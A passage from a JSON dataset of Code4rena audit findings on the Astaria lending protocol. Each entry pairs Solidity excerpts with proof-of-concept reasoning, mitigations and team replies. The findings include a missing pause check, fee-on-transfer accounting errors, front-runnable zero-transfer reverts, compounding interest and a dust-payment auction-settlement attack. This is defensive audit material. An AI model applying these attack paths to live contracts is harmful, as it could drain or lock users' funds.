lien token buyout.\n\nIf the max interest rate is high, the interest can become unreasonable for a vault and not fair for lender to pay out the accuring debt.\n\nIf the epoch lengh is too long, the gap between withdraw is too long and the user cannot withdraw their fund on time.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol add reasonable boundary to fee setting and liqudation length setting.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/77",
      "tags": [],
      "finders": []
    },
    {
      "id": "25850",
      "title": "[M-34] Pause checks are missing on deposit for Private Vault",
      "impact": "MEDIUM",
      "content": "\nIt is possible to make a deposit even when `_loadVISlot().isShutdown` is true. This check is done in `whenNotPaused` modifier and is already done for Public Vault but is missing for Private Vault, allowing unexpected deposits.\n\n### Proof of Concept\n\n1.  Observe the deposit function at <https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L59>\n\n```\n\n    function deposit(uint256 amount, address receiver)\n        public\n        virtual\n        returns (uint256)\n      {\n        VIData storage s = _loadVISlot();\n        require(s.allowList[msg.sender] && receiver == owner());\n        ERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);\n        return amount;\n      }\n```\n\n2.  Observe there is no `whenNotPaused` modifier in deposit which confirm that shutdown has not been called yet\n\n```\n\n    modifier whenNotPaused() {\n        if (ROUTER().paused()) {\n          revert InvalidRequest(InvalidRequestReason.PAUSED);\n        }\n\n        if (_loadVISlot().isShutdown) {\n          revert InvalidRequest(InvalidRequestReason.SHUTDOWN);\n        }\n        _;\n      }\n```\n\n### Recommended Mitigation Steps\n\nRevise the deposit function as below:\n\n    function deposit(uint256 amount, address receiver)\n        public\n        virtual \n        whenNotPaused\n        returns (uint256)\n      {\n        VIData storage s = _loadVISlot();\n        require(s.allowList[msg.sender] && receiver == owner());\n        ERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);\n        return amount;\n      }\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/25#issuecomment-1405587817):**\n > It makes sense though considering it's a private vault so only the owner can deposit.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/25)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the deposit function of an Ethereum smart contract. The check for the `whenNotPaused` modifier was missing in the Private Vault, allowing unexpected deposits even when `_loadVISlot().isShutdown` is true. As a proof of concept, the code of the deposit function was observed and it was found that the `whenNotPaused` modifier was missing.\n\nThe recommended mitigation step is to revise the deposit function by adding the `whenNotPaused` modifier. This will ensure that deposits are not allowed when the `_loadVISlot().isShutdown` is true. This makes sense as it is a private vault and it should only be possible for the owner to make deposits. This was confirmed by both the judge and the Astaria team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/25",
      "tags": [],
      "finders": [
        "csanuragjain",
        "0xbepresent"
      ]
    },
    {
      "id": "25849",
      "title": "[M-33] Lack of support for fee-on-transfer token",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L34><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L181><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L643>\n\nIn the codebase, the usage of safeTransfer and safeTransferFrom assume that the receiver receives the exact transferred amount.\n\n```solidity\nsrc\\AstariaRouter.sol:\n  528      ERC20(IAstariaVaultBase(commitments[0].lienRequest.strategy.vault).asset())\n  529:       .safeTransfer(msg.sender, totalBorrowed);\n  530    }\n\nsrc\\ClearingHouse.sol:\n  142  \n  143:     ERC20(paymentToken).safeTransfer(\n  144        s.auctionStack.liquidator,\n\n  160      if (ERC20(paymentToken).balanceOf(address(this)) > 0) {\n  161:       ERC20(paymentToken).safeTransfer(\n  162          ASTARIA_ROUTER.COLLATERAL_TOKEN().ownerOf(collateralId),\n\nsrc\\PublicVault.sol:\n  383  \n  384:       ERC20(asset()).safeTransfer(currentWithdrawProxy, withdrawBalance);\n  385        WithdrawProxy(currentWithdrawProxy).increaseWithdrawReserveReceived(\n\nsrc\\VaultImplementation.sol:\n  393      payout = _handleProtocolFee(c.lienRequest.amount);\n  394:     ERC20(asset()).safeTransfer(receiver, payout);\n  395    }\n\n  405        }\n  406:       ERC20(asset()).safeTransfer(feeTo, fee);\n  407      }\n\nsrc\\WithdrawProxy.sol:\n  268      if (s.withdrawRatio == uint256(0)) {\n  269:       ERC20(asset()).safeTransfer(VAULT(), balance);\n  270      } else {\n\n  280        if (balance > 0) {\n  281:         ERC20(asset()).safeTransfer(VAULT(), balance);\n  282        }\n\n  297      }\n  298:     ERC20(asset()).safeTransfer(withdrawProxy, amount);\n  299      return amount;\n```\n\nHowever, according to <https://github.com/d-xo/weird-erc20#fee-on-transfer>\n\nSome tokens take a transfer fee (e.g. STA, PAXG), some do not currently charge a fee but may do so in the future (e.g. USDT, USDC).\n\nSo the recipient address may not receive the full transfered amount, which can break the protocol's accounting and revert transaction.\n\nThe same safeTransfer and safeTransferFrom is used in the vault deposit / withdraw / mint / withdraw function.\n\nLet us see a concrete example,\n\n```solidity\ncontract TransferProxy is Auth, ITransferProxy {\n  using SafeTransferLib for ERC20;\n\n  constructor(Authority _AUTHORITY) Auth(msg.sender, _AUTHORITY) {\n    //only constructor we care about is  Auth\n  }\n\n  function tokenTransferFrom(\n    address token,\n    address from,\n    address to,\n    uint256 amount\n  ) external requiresAuth {\n    ERC20(token).safeTransferFrom(from, to, amount);\n  }\n}\n```\n\nThe transfer Proxy also use\n\n```solidity\nERC20(token).safeTransferFrom(from, to, amount);\n```\n\nThis transfer is used extensively\n\n```solidity\n\nsrc\\AstariaRouter.sol:\n  208      RouterStorage storage s = _loadRouterSlot();\n  209:     s.TRANSFER_PROXY.tokenTransferFrom(\n  210        address(token),\n\nsrc\\LienToken.sol:\n  184      );\n  185:     s.TRANSFER_PROXY.tokenTransferFrom(\n  186        params.encumber.stack[params.position].lien.token,\n\n  654      if (payment > 0)\n  655:       s.TRANSFER_PROXY.tokenTransferFrom(token, payer, payee, payment);\n  656  \n\n  860  \n  861:     s.TRANSFER_PROXY.tokenTransferFrom(stack.lien.token, payer, payee, amount);\n  862  \n\nsrc\\scripts\\deployments\\Deploy.sol:\n  378        uint8(UserRoles.ASTARIA_ROUTER),\n  379:       TRANSFER_PROXY.tokenTransferFrom.selector,\n  380        true\n\n  403        uint8(UserRoles.LIEN_TOKEN),\n  404:       TRANSFER_PROXY.tokenTransferFrom.selector,\n  405        true\n```\n\nIf the token used charged a transfer fee, the accounting below is broken:\n\nWhen \\_payDebt is called\n\n```solidity\n  function _payDebt(\n    LienStorage storage s,\n    address token,\n    uint256 payment,\n    address payer,\n    AuctionStack[] memory stack\n  ) internal returns (uint256 totalSpent) {\n    uint256 i;\n    for (; i < stack.length;) {\n      uint256 spent;\n      unchecked {\n        spent = _paymentAH(s, token, stack, i, payment, payer);\n        totalSpent += spent;\n        payment -= spent;\n        ++i;\n      }\n    }\n  }\n```\n\nWhich calls \\_paymentAH\n\n```solidity\n  function _paymentAH(\n    LienStorage storage s,\n    address token,\n    AuctionStack[] memory stack,\n    uint256 position,\n    uint256 payment,\n    address payer\n  ) internal returns (uint256) {\n    uint256 lienId = stack[position].lienId;\n    uint256 end = stack[position].end;\n    uint256 owing = stack[position].amountOwed;\n    //checks the lien exists\n    address payee = _getPayee(s, lienId);\n    uint256 remaining = 0;\n    if (owing > payment.safeCastTo88()) {\n      remaining = owing - payment;\n    } else {\n      payment = owing;\n    }\n    if (payment > 0)\n      s.TRANSFER_PROXY.tokenTransferFrom(token, payer, payee, payment);\n\n    delete s.lienMeta[lienId]; //full delete\n    delete stack[position];\n    _burn(lienId);\n\n    if (_isPublicVault(s, payee)) {\n      IPublicVault(payee).updateAfterLiquidationPayment(\n        IPublicVault.LiquidationPaymentParams({remaining: remaining})\n      );\n    }\n    emit Payment(lienId, payment);\n    return payment;\n  }\n```\n\nNote that the code\n\n```solidity\ns.TRANSFER_PROXY.tokenTransferFrom(token, payer, payee, payment);\n```\n\nif the token charge transfer fee, for example, the payment amount is 100 ETH. 1 ETH is charged as fee, the recipient only receive 99 ETH,\n\nbut the wrong value payment 100 ETH is returned and used to update the accounting\n\n```solidity\nunchecked {\n\tspent = _paymentAH(s, token, stack, i, payment, payer);\n\ttotalSpent += spent;\n\tpayment -= spent;\n  ++i;\n}\n```\n\nThen the variable totalSpent and payment amount will be not valid.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol whitelist the token address or use balance before and after check to make sure the recipient receives the accurate amount of token when token transfer is performed.\n\n**[SantiagoGregory (Astaria) acknowledged and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/51#issuecomment-1412982619):**\n > USDC and USDT fees would break other contracts as well, and we won't be supporting other tokens with fees at a UI level.\n\n\n\n***\n\n",
      "summary": "\nThis bug report was related to the codebase of the Astaria protocol, which is an Ethereum-based decentralized finance protocol. It is based on the assumption that the receiver receives the exact amount of the transferred amount. However, according to the Weird ERC20 project, some tokens take a transfer fee (e.g. STA, PAXG), some do not currently charge a fee but may do so in the future (e.g. USDT, USDC). This means that the recipient address may not receive the full transferred amount, which can break the protocol's accounting and revert the transaction. \n\nThe same safeTransfer and safeTransferFrom are used in the vault deposit / withdraw / mint / withdraw function, as well as the transfer Proxy. If a token used charged a transfer fee, the accounting would be broken. This is because the wrong value payment is returned and used to update the accounting. \n\nTo mitigate this issue, it is recommended that the protocol whitelist the token address or use balance before and after check to make sure the recipient receives the accurate amount of token when token transfer is performed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/51",
      "tags": [],
      "finders": [
        "fs0c",
        "Bjorn\\_bug",
        "joestakey",
        "kaden",
        "ladboy233",
        "Jujic",
        "RaymondFam",
        "KIntern\\_NA",
        "unforgiven",
        "obront"
      ]
    },
    {
      "id": "25848",
      "title": "[M-32] Certain function can be blocked if the ERC20 token revert in 0 amount transfer after `PublicVault#transferWithdrawReserve` is called",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L295><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L421><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L359><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L372><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L384>\n\nThe function transferWithdrawReserve in Public Vault has no access control.\n\n```solidity\n  function transferWithdrawReserve() public {\n    VaultData storage s = _loadStorageSlot();\n\n    if (s.currentEpoch == uint64(0)) {\n      return;\n    }\n\n    address currentWithdrawProxy = s\n      .epochData[s.currentEpoch - 1]\n      .withdrawProxy;\n    // prevents transfer to a non-existent WithdrawProxy\n    // withdrawProxies are indexed by the epoch where they're deployed\n    if (currentWithdrawProxy != address(0)) {\n      uint256 withdrawBalance = ERC20(asset()).balanceOf(address(this));\n\n      // prevent transfer of more assets then are available\n      if (s.withdrawReserve <= withdrawBalance) {\n        withdrawBalance = s.withdrawReserve;\n        s.withdrawReserve = 0;\n      } else {\n        unchecked {\n          s.withdrawReserve -= withdrawBalance.safeCastTo88();\n        }\n      }\n\n      ERC20(asset()).safeTransfer(currentWithdrawProxy, withdrawBalance);\n      WithdrawProxy(currentWithdrawProxy).increaseWithdrawReserveReceived(\n        withdrawBalance\n      );\n      emit WithdrawReserveTransferred(withdrawBalance);\n    }\n\n    address withdrawProxy = s.epochData[s.currentEpoch].withdrawProxy;\n    if (\n      s.withdrawReserve > 0 &&\n      timeToEpochEnd() == 0 &&\n      withdrawProxy != address(0)\n    ) {\n      address currentWithdrawProxy = s\n        .epochData[s.currentEpoch - 1]\n        .withdrawProxy;\n      uint256 drainBalance = WithdrawProxy(withdrawProxy).drain(\n        s.withdrawReserve,\n        s.epochData[s.currentEpoch - 1].withdrawProxy\n      );\n      unchecked {\n        s.withdrawReserve -= drainBalance.safeCastTo88();\n      }\n      WithdrawProxy(currentWithdrawProxy).increaseWithdrawReserveReceived(\n        drainBalance\n      );\n    }\n  }\n```\n\nIf this function is called, the token balance is transfered to withdrawProxy\n\n```solidity\nuint256 withdrawBalance = ERC20(asset()).balanceOf(address(this));\n```\n\nand\n\n```solidity\nERC20(asset()).safeTransfer(currentWithdrawProxy, withdrawBalance);\n```\n\nHowever, according to\n\n<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>\n\nSome tokens (e.g. LEND) revert when transfering a zero value amount.\n\nIf `ERC20(asset()).balanceOf(address(this))` return 0, the transfer revert.\n\nThe impact is that transferWithdrawReserve is also used in the other place:\n\n```solidity\n  function commitToLien(\n    IAstariaRouter.Commitment calldata params,\n    address receiver\n  )\n    external\n    whenNotPaused\n    returns (uint256 lienId, ILienToken.Stack[] memory stack, uint256 payout)\n  {\n    _beforeCommitToLien(params);\n    uint256 slopeAddition;\n    (lienId, stack, slopeAddition, payout) = _requestLienAndIssuePayout(\n      params,\n      receiver\n    );\n    _afterCommitToLien(\n      stack[stack.length - 1].point.end,\n      lienId,\n      slopeAddition\n    );\n  }\n```\n\nwhich calls:\n\n```solidity\n_beforeCommitToLien(params);\n```\n\nwhich calls:\n\n```solidity\n  function _beforeCommitToLien(IAstariaRouter.Commitment calldata params)\n    internal\n    virtual\n    override(VaultImplementation)\n  {\n    VaultData storage s = _loadStorageSlot();\n\n    if (s.withdrawReserve > uint256(0)) {\n      transferWithdrawReserve();\n    }\n    if (timeToEpochEnd() == uint256(0)) {\n      processEpoch();\n    }\n  }\n```\n\nwhich calls transferWithdrawReserve() which revert in 0 amount transfer.\n\nConsider the case below:\n\n1.  User A calls commitToLien transaction is pending in mempool.\n2.  User B front-run User A's transaction by calling  transferWithdrawReserve() and the PublicVault has no ERC20 token balance or User B just want to call  transferWithdrawReserve and not try to front-run user A, but the impact and result is the same.\n3.  User B's transaction executes first,\n4.  User A first his transaction revert because the ERC20 token asset revert in 0 amount transfer in transferWithdrawReserve() call\n\n```solidity\nuint256 withdrawBalance = ERC20(asset()).balanceOf(address(this));\n\n// prevent transfer of more assets then are available\nif (s.withdrawReserve <= withdrawBalance) {\nwithdrawBalance = s.withdrawReserve;\ns.withdrawReserve = 0;\n} else {\nunchecked {\n  s.withdrawReserve -= withdrawBalance.safeCastTo88();\n}\n}\n\nERC20(asset()).safeTransfer(currentWithdrawProxy, withdrawBalance);\n```\n\nThis revertion not only impacts commitToLien, but also impacts `PublicVault.sol#updateVaultAfterLiquidation`\n\n```solidity\nfunction updateVaultAfterLiquidation(\nuint256 maxAuctionWindow,\nAfterLiquidationParams calldata params\n) public onlyLienToken returns (address withdrawProxyIfNearBoundary) {\nVaultData storage s = _loadStorageSlot();\n\n_accrue(s);\nunchecked {\n  _setSlope(s, s.slope - params.lienSlope.safeCastTo48());\n}\n\nif (s.currentEpoch != 0) {\n  transferWithdrawReserve();\n}\nuint64 lienEpoch = getLienEpoch(params.lienEnd);\n_decreaseEpochLienCount(s, lienEpoch);\n\nuint256 timeToEnd = timeToEpochEnd(lienEpoch);\nif (timeToEnd < maxAuctionWindow) {\n  _deployWithdrawProxyIfNotDeployed(s, lienEpoch);\n  withdrawProxyIfNearBoundary = s.epochData[lienEpoch].withdrawProxy;\n\n  WithdrawProxy(withdrawProxyIfNearBoundary).handleNewLiquidation(\n\tparams.newAmount,\n\tmaxAuctionWindow\n  );\n}\n```\n\nTransaction can revert in above code when calling\n\n```solidity\nif (s.currentEpoch != 0) {\n  transferWithdrawReserve();\n}\nuint64 lienEpoch = getLienEpoch(params.lienEnd);\n```\n\nIf the address has no ERC20 token balance and the ERC20 token revert in 0 amount transfer after PublicVault#transferWithdrawReserve is called first.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol just return and do nothing when `PublicVault#transferWithdrawReserve` is called if the address has no ERC20 token balance.\n\n**[androolloyd (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/54)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a function called `transferWithdrawReserve` in the Public Vault smart contract which has no access control. This function transfers the token balance to a withdrawProxy, but some tokens (e.g. LEND) revert when transferring a zero value amount. This can cause a transaction to revert if the address has no ERC20 token balance and the ERC20 token reverts in 0 amount transfer after PublicVault#transferWithdrawReserve is called first. This not only impacts commitToLien, but also impacts `PublicVault.updateVaultAfterLiquidation`.\n\nThe recommended mitigation step is for the protocol to just return and do nothing when `PublicVault#transferWithdrawReserve` is called if the address has no ERC20 token balance. This has been confirmed by androolloyd (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/54",
      "tags": [],
      "finders": [
        "KIntern\\_NA",
        "ladboy233"
      ]
    },
    {
      "id": "25847",
      "title": "[M-31] `LienToken._payment` function increases users debt",
      "impact": "MEDIUM",
      "content": "\nLienToken.\\_payment function increases users debt. Every time when user pays not whole lien amount then interests are added to the loan amount, so next time user pays interests based on interests.\n\n### Proof of Concept\n\n`LienToken._payment` is used by `LienToken.makePayment` function that allows borrower to repay part or all his debt.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L790-L853>\n\n```solidity\n  function _payment(\n    LienStorage storage s,\n    Stack[] memory activeStack,\n    uint8 position,\n    uint256 amount,\n    address payer\n  ) internal returns (Stack[] memory, uint256) {\n    Stack memory stack = activeStack[position];\n    uint256 lienId = stack.point.lienId;\n\n\n    if (s.lienMeta[lienId].atLiquidation) {\n      revert InvalidState(InvalidStates.COLLATERAL_AUCTION);\n    }\n    uint64 end = stack.point.end;\n    // Blocking off payments for a lien that has exceeded the lien.end to prevent repayment unless the msg.sender() is the AuctionHouse\n    if (block.timestamp >= end) {\n      revert InvalidLoanState();\n    }\n    uint256 owed = _getOwed(stack, block.timestamp);\n    address lienOwner = ownerOf(lienId);\n    bool isPublicVault = _isPublicVault(s, lienOwner);\n\n\n    address payee = _getPayee(s, lienId);\n\n\n    if (amount > owed) amount = owed;\n    if (isPublicVault) {\n      IPublicVault(lienOwner).beforePayment(\n        IPublicVault.BeforePaymentParams({\n          interestOwed: owed - stack.point.amount,\n          amount: stack.point.amount,\n          lienSlope: calculateSlope(stack)\n        })\n      );\n    }\n\n\n    //bring the point up to block.timestamp, compute the owed\n    stack.point.amount = owed.safeCastTo88();\n    stack.point.last = block.timestamp.safeCastTo40();\n\n\n    if (stack.point.amount > amount) {\n      stack.point.amount -= amount.safeCastTo88();\n      //      // slope does not need to be updated if paying off the rest, since we neutralize slope in beforePayment()\n      if (isPublicVault) {\n        IPublicVault(lienOwner).afterPayment(calculateSlope(stack));\n      }\n    } else {\n      amount = stack.point.amount;\n      if (isPublicVault) {\n        // since the openLiens count is only positive when there are liens that haven't been paid off\n        // that should be liquidated, this lien should not be counted anymore\n        IPublicVault(lienOwner).decreaseEpochLienCount(\n          IPublicVault(lienOwner).getLienEpoch(end)\n        );\n      }\n      delete s.lienMeta[lienId]; //full delete of point data for the lien\n      _burn(lienId);\n      activeStack = _removeStackPosition(activeStack, position);\n    }\n\n\n    s.TRANSFER_PROXY.tokenTransferFrom(stack.lien.token, payer, payee, amount);\n\n\n    emit Payment(lienId, amount);\n    return (activeStack, amount);\n  }\n```\n\nThe main problem is in line 826. `stack.point.amount = owed.safeCastTo88();`<br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L826>\n\nHere `stack.point.amount` becomes `stack.point.amount` + accrued interests, because `owed` is loan amount + accrued interests by this time.\n\n`stack.point.amount` is the amount that user borrowed. So actually that line has just increased user's debt. And in case if [he didn't pay all amount](https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L830) of lien, then next time he will pay more interests, because interests [depend on loan amount](https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L262).\n\nIn the docs Astaria protocol claims that:\n\n> All rates on the Astaria protocol are in simple interest and non-compounding.\n\n<https://docs.astaria.xyz/docs/protocol-mechanics/loanterms>\n\nYou can check that inside \"Interest rate\" section.\n\nHowever `_payment` function is compounding interests.\n\nTo avoid this, another field `interestsAccrued` should be introduced which will track already accrued interests.\n\n### Tools Used\n\nVsCode\n\n### Recommended Mitigation Steps\n\nYou need to store accrued interests by the moment of repayment to another variable `interestsAccrued`.\n\nAnd calculate `_getInterest` functon like this.\n\n```solidity\nfunction _getInterest(Stack memory stack, uint256 timestamp)\n    internal\n    pure\n    returns (uint256)\n  {\n    uint256 delta_t = timestamp - stack.point.last;\n\n    return stack.point.interestsAccrued + (delta_t * stack.lien.details.rate).mulWadDown(stack.point.amount);\n  }\n```\n\n**[SantiagoGregory (Astaria) acknowledged and commented via duplicate issue `#574`](https://github.com/code-423n4/2023-01-astaria-findings/issues/574#event-8400652204):**\n> This is the intended flow, early payments will compound interest.\n\n**[Picodes (judge) commented via duplicate issue `#574`](https://github.com/code-423n4/2023-01-astaria-findings/issues/574#issuecomment-1439156798)**\n> Keeping medium severity because of the mention in the doc stating that interests are non-compounding, so considering this is a broken functionality.\n> \n> https://docs.astaria.xyz/docs/protocol-mechanics/loanterms\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the LienToken._payment function in Astaria protocol, which increases users debt every time when user pays part of the lien amount. This is because the line `stack.point.amount = owed.safeCastTo88();` in the code adds accrued interests to the loan amount, so the next time user pays interests based on interests. \n\nThe Astaria protocol claims that all rates are in simple interest and non-compounding, however this function is compounding interests. To avoid this, another field `interestsAccrued` should be introduced which will track already accrued interests. The recommended mitigation steps are to store accrued interests by the moment of repayment to another variable `interestsAccrued` and calculate the _getInterest function as specified.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/96",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "bin2chen",
        "evan",
        "ladboy233"
      ]
    },
    {
      "id": "25846",
      "title": "[M-30] Adversary can game the liquidation flow by transfering a dust amount of the payment token to ClearingHouse contract to settle the auction if no one buy the auctioned NFT",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L169><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L123>\n\nThe function ClearingHouse#safeTransferFrom is meant to settle the auction but the function severely lack of access control.\n\n```solidity\n  function safeTransferFrom(\n    address from, // the from is the offerer\n    address to,\n    uint256 identifier,\n    uint256 amount,\n    bytes calldata data //empty from seaport\n  ) public {\n    //data is empty and useless\n    _execute(from, to, identifier, amount);\n  }\n```\n\nwhich calls:\n\n```solidity\n  function _execute(\n    address tokenContract, // collateral token sending the fake nft\n    address to, // buyer\n    uint256 encodedMetaData, //retrieve token address from the encoded data\n    uint256 // space to encode whatever is needed,\n  ) internal {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0)); // get the router from the immutable arg\n\n    ClearingHouseStorage storage s = _getStorage();\n    address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();\n\n    uint256 currentOfferPrice = _locateCurrentAmount({\n      startAmount: s.auctionStack.startAmount,\n      endAmount: s.auctionStack.endAmount,\n      startTime: s.auctionStack.startTime,\n      endTime: s.auctionStack.endTime,\n      roundUp: true //we are a consideration we round up\n    });\n    uint256 payment = ERC20(paymentToken).balanceOf(address(this));\n\n    require(payment >= currentOfferPrice, \"not enough funds received\");\n\n    uint256 collateralId = _getArgUint256(21);\n    // pay liquidator fees here\n\n    ILienToken.AuctionStack[] storage stack = s.auctionStack.stack;\n\n    uint256 liquidatorPayment = ASTARIA_ROUTER.getLiquidatorFee(payment);\n\n    ERC20(paymentToken).safeTransfer(\n      s.auctionStack.liquidator,\n      liquidatorPayment\n    );\n\n    ERC20(paymentToken).safeApprove(\n      address(ASTARIA_ROUTER.TRANSFER_PROXY()),\n      payment - liquidatorPayment\n    );\n\n    ASTARIA_ROUTER.LIEN_TOKEN().payDebtViaClearingHouse(\n      paymentToken,\n      collateralId,\n      payment - liquidatorPayment,\n      s.auctionStack.stack\n    );\n\n    if (ERC20(paymentToken).balanceOf(address(this)) > 0) {\n      ERC20(paymentToken).safeTransfer(\n        ASTARIA_ROUTER.COLLATERAL_TOKEN().ownerOf(collateralId),\n        ERC20(paymentToken).balanceOf(address(this))\n      );\n    }\n    ASTARIA_ROUTER.COLLATERAL_TOKEN().settleAuction(collateralId);\n  }\n```\n\nWe can look into the liquidation flow:\n\nFirst, the liquidate function is called in AstariaRouter.sol\n\n```solidity\n  function liquidate(ILienToken.Stack[] memory stack, uint8 position)\n    public\n    returns (OrderParameters memory listedOrder)\n  {\n    if (!canLiquidate(stack[position])) {\n      revert InvalidLienState(LienState.HEALTHY);\n    }\n\n    RouterStorage storage s = _loadRouterSlot();\n    uint256 auctionWindowMax = s.auctionWindow + s.auctionWindowBuffer;\n\n    s.LIEN_TOKEN.stopLiens(\n      stack[position].lien.collateralId,\n      auctionWindowMax,\n      stack,\n      msg.sender\n    );\n    emit Liquidation(stack[position].lien.collateralId, position);\n    listedOrder = s.COLLATERAL_TOKEN.auctionVault(\n      ICollateralToken.AuctionVaultParams({\n        settlementToken: stack[position].lien.token,\n        collateralId: stack[position].lien.collateralId,\n        maxDuration: auctionWindowMax,\n        startingPrice: stack[0].lien.details.liquidationInitialAsk,\n        endingPrice: 1_000 wei\n      })\n    );\n  }\n```\n\nThen function auctionVault is called in CollateralToken\n\n```solidity\nfunction auctionVault(AuctionVaultParams calldata params)\n\texternal\n\trequiresAuth\nreturns (OrderParameters memory orderParameters)\n{\nCollateralStorage storage s = _loadCollateralSlot();\n\nuint256[] memory prices = new uint256[](2);\nprices[0] = params.startingPrice;\nprices[1] = params.endingPrice;\norderParameters = _generateValidOrderParameters(\n  s,\n  params.settlementToken,\n  params.collateralId,\n  prices,\n  params.maxDuration\n);\n\n_listUnderlyingOnSeaport(\n  s,\n  params.collateralId,\n  Order(orderParameters, new bytes(0))\n);\n}\n```\n\nThe function \\_generateValidOrderParameters is important:\n\n```solidity\n\n  function _generateValidOrderParameters(\n    CollateralStorage storage s,\n    address settlementToken,\n    uint256 collateralId,\n    uint256[] memory prices,\n    uint256 maxDuration\n  ) internal returns (OrderParameters memory orderParameters) {\n    OfferItem[] memory offer = new OfferItem[](1);\n\n    Asset memory underlying = s.idToUnderlying[collateralId];\n\n    offer[0] = OfferItem(\n      ItemType.ERC721,\n      underlying.tokenContract,\n      underlying.tokenId,\n      1,\n      1\n    );\n\n    ConsiderationItem[] memory considerationItems = new ConsiderationItem[](2);\n    considerationItems[0] = ConsiderationItem(\n      ItemType.ERC20,\n      settlementToken,\n      uint256(0),\n      prices[0],\n      prices[1],\n      payable(address(s.clearingHouse[collateralId]))\n    );\n    considerationItems[1] = ConsiderationItem(\n      ItemType.ERC1155,\n      s.clearingHouse[collateralId],\n      uint256(uint160(settlementToken)),\n      prices[0],\n      prices[1],\n      payable(s.clearingHouse[collateralId])\n    );\n\n    orderParameters = OrderParameters({\n      offerer: s.clearingHouse[collateralId],\n      zone: address(this), // 0x20\n      offer: offer,\n      consideration: considerationItems,\n      orderType: OrderType.FULL_OPEN,\n      startTime: uint256(block.timestamp),\n      endTime: uint256(block.timestamp + maxDuration),\n      zoneHash: bytes32(collateralId),\n      salt: uint256(blockhash(block.number)),\n      conduitKey: s.CONDUIT_KEY, // 0x120\n      totalOriginalConsiderationItems: considerationItems.length\n    });\n  }\n```\n\nNote the first consideration item:\n\n```solidity\nConsiderationItem[] memory considerationItems = new ConsiderationItem[](2);\nconsiderationItems[0] = ConsiderationItem(\n  ItemType.ERC20,\n  settlementToken,\n  uint256(0),\n  prices[0],\n  prices[1],\n  payable(address(s.clearingHouse[collateralId]))\n);\n```\n\nPrices\\[0] is the initialLiquidationPrice the starting price, prices\\[1] is the ending price, which is 1000 WEI. This means if no one buys the dutch auction, the price will fall to 1000 WEI.\n\n```solidity\nClearingHouseStorage storage s = _getStorage();\naddress paymentToken = bytes32(encodedMetaData).fromLast20Bytes();\n\nuint256 currentOfferPrice = _locateCurrentAmount({\n  startAmount: s.auctionStack.startAmount,\n  endAmount: s.auctionStack.endAmount,\n  startTime: s.auctionStack.startTime,\n  endTime: s.auctionStack.endTime,\n  roundUp: true //we are a consideration we round up\n});\nuint256 payment = ERC20(paymentToken).balanceOf(address(this));\n\nrequire(payment >= currentOfferPrice, \"not enough funds received\");\n```\n\nIn the code above, note that the code checks if the current balance of the payment token is larger than currentOfferPrice computed by 